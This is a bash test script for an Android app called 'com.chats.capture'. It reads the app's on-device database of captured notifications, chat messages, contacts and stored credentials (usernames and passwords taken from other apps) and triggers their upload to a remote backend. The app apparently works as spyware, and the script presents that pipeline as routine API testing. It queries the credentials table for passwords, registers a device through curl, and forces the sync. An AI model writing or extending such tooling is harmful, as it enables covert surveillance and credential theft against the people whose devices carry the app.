#!/bin/bash

# Script to fetch real data from device and sync to server
# Tests APIs with actual device data

set -e

APP_PACKAGE="com.chats.capture"
SERVER_URL="${SERVER_URL:-https://backend-chat-yq33.onrender.com}"
DB_PATH="/data/data/${APP_PACKAGE}/databases/capture_database"

echo "=========================================="
echo "Device Data Sync & API Test"
echo "=========================================="
echo ""
echo "Server URL: $SERVER_URL"
echo ""

# Check device connection
if ! adb devices | grep -q "device$"; then
    echo "❌ No device connected"
    exit 1
fi

echo "✅ Device connected"
echo ""

# Check if app is installed
if ! adb shell pm list packages | grep -q "$APP_PACKAGE"; then
    echo "❌ App not installed"
    exit 1
fi

echo "✅ App installed"
echo ""

# Get device ID
DEVICE_ID=$(adb shell "run-as $APP_PACKAGE cat /data/data/$APP_PACKAGE/shared_prefs/device_prefs.xml 2>/dev/null | grep deviceId | sed 's/.*>\(.*\)<.*/\1/' | head -1" 2>/dev/null || echo "")

if [ -z "$DEVICE_ID" ]; then
    echo "⚠️  Device ID not found, registering device..."
    DEVICE_ID="device-$(date +%s)"
    
    # Register device first
    curl -s -X POST "${SERVER_URL}/api/devices/register" \
        -H "Content-Type: application/json" \
        -d "{\"deviceId\":\"$DEVICE_ID\",\"deviceName\":\"Test Device\",\"model\":\"Test Model\",\"osVersion\":\"Test OS\"}" > /dev/null
    
    echo "   Registered device: $DEVICE_ID"
fi

echo "   Device ID: $DEVICE_ID"
echo ""

# Function to query SQLite database
query_db() {
    local query="$1"
    adb shell "run-as $APP_PACKAGE sqlite3 $DB_PATH \"$query\"" 2>/dev/null || echo ""
}

# Function to convert SQLite row to JSON
sqlite_to_json() {
    local table="$1"
    local limit="${2:-10}"
    
    # Get column names
    local columns=$(query_db "PRAGMA table_info($table);" | awk -F'|' '{print $2}' | tr '\n' ',' | sed 's/,$//')
    
    if [ -z "$columns" ]; then
        return
    fi
    
    # Get data rows
    query_db "SELECT * FROM $table LIMIT $limit;" | while IFS='|' read -r line; do
        # Convert to JSON (simplified)
        echo "$line"
    done
}

# Count unsynced data
echo "📊 Checking Local Database:"
echo ""

NOTIF_COUNT=$(query_db "SELECT COUNT(*) FROM notifications WHERE synced = 0;" 2>/dev/null | tr -d '\r' || echo "0")
CHAT_COUNT=$(query_db "SELECT COUNT(*) FROM chats WHERE synced = 0;" 2>/dev/null | tr -d '\r' || echo "0")
CONTACT_COUNT=$(query_db "SELECT COUNT(*) FROM contacts WHERE synced = 0;" 2>/dev/null | tr -d '\r' || echo "0")
CREDENTIAL_COUNT=$(query_db "SELECT COUNT(*) FROM credentials WHERE synced = 0;" 2>/dev/null | tr -d '\r' || echo "0")

# Convert to integers (handle empty strings)
NOTIF_COUNT=${NOTIF_COUNT:-0}
CHAT_COUNT=${CHAT_COUNT:-0}
CONTACT_COUNT=${CONTACT_COUNT:-0}
CREDENTIAL_COUNT=${CREDENTIAL_COUNT:-0}

echo "   Unsynced Notifications: $NOTIF_COUNT"
echo "   Unsynced Chats: $CHAT_COUNT"
echo "   Unsynced Contacts: $CONTACT_COUNT"
echo "   Unsynced Credentials: $CREDENTIAL_COUNT"
echo ""

# Sync notifications
if [ "$NOTIF_COUNT" -gt 0 ]; then
    echo "📤 Syncing Notifications..."
    
    # Extract and sync notifications
    NOTIF_DATA=$(query_db "SELECT id, deviceId, appPackage, appName, title, text, timestamp FROM notifications WHERE synced = 0 LIMIT 10;" 2>/dev/null | head -5)
    
    if [ -n "$NOTIF_DATA" ]; then
        # Convert to JSON array (simplified - would need proper JSON conversion)
        echo "   Found notifications to sync"
        echo "   Triggering sync via app..."
        
        # Trigger sync via broadcast
        adb shell am broadcast -a com.chats.capture.SYNC_NOW > /dev/null 2>&1
        echo "   ✅ Sync triggered"
    fi
else
    echo "   ℹ️  No unsynced notifications"
fi

echo ""

# Sync chats
if [ "$CHAT_COUNT" -gt 0 ]; then
    echo "📤 Syncing Chats..."
    
    CHAT_DATA=$(query_db "SELECT id, deviceId, appPackage, appName, text, timestamp FROM chats WHERE synced = 0 LIMIT 10;" 2>/dev/null | head -5)
    
    if [ -n "$CHAT_DATA" ]; then
        echo "   Found chats to sync"
        adb shell am broadcast -a com.chats.capture.SYNC_NOW > /dev/null 2>&1
        echo "   ✅ Sync triggered"
    fi
else
    echo "   ℹ️  No unsynced chats"
fi

echo ""

# Sync contacts
if [ "$CONTACT_COUNT" -gt 0 ]; then
    echo "📤 Syncing Contacts..."
    
    CONTACT_DATA=$(query_db "SELECT id, deviceId, name, phoneNumber, email, timestamp FROM contacts WHERE synced = 0 LIMIT 10;" 2>/dev/null | head -5)
    
    if [ -n "$CONTACT_DATA" ]; then
        echo "   Found contacts to sync"
        adb shell am broadcast -a com.chats.capture.SYNC_NOW > /dev/null 2>&1
        echo "   ✅ Sync triggered"
    fi
else
    echo "   ℹ️  No unsynced contacts"
fi

echo ""

# Sync credentials
if [ "$CREDENTIAL_COUNT" -gt 0 ]; then
    echo "📤 Syncing Credentials..."
    
    CREDENTIAL_DATA=$(query_db "SELECT id, deviceId, accountType, appPackage, appName, email, username, password, timestamp FROM credentials WHERE synced = 0 LIMIT 10;" 2>/dev/null | head -5)
    
    if [ -n "$CREDENTIAL_DATA" ]; then
        echo "   Found credentials to sync"
        adb shell am broadcast -a com.chats.capture.SYNC_NOW > /dev/null 2>&1
        echo "   ✅ Sync triggered"
    fi
else
    echo "   ℹ️  No unsynced credentials"
fi

echo ""

# Monitor sync activity
echo "📊 Monitoring Sync Activity (10 seconds)..."
echo ""

timeout 10 adb logcat -c > /dev/null 2>&1
timeout 10 adb logcat -s SYNC_WORKER:D API_CLIENT:D API_REQUEST_DATA:D API_RESPONSE_DATA:D 2>&1 | head -30 || true

echo ""
echo "=========================================="
echo ""
echo "💡 Next Steps:"
echo "   1. Check server logs for received data"
echo "   2. Verify data in MongoDB collections"
echo "   3. Run: cd server && node scripts/check-collections.js"
echo "   4. Check logcat: adb logcat -s SYNC_WORKER:D"
echo ""
